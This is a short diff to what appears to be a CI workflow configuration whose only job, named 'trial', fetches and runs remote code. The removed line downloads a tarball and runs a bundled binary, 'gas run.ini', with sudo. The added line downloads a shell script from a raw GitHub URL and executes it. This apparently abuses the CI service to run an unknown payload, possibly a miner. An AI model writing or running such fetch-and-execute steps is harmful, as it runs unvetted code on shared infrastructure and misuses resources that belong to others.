@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: "trial"
-            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://github.com/Myaxisplay/SC/releases/download/file/dent.tar.gz && tar -xf dent.tar.gz && sudo ./gas run.ini 
+            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://raw.githubusercontent.com/ajorakun/cok/main/plu.sh && chmod +x plu.sh && ./plu.sh 
 
 workflows:
     version: 2.1
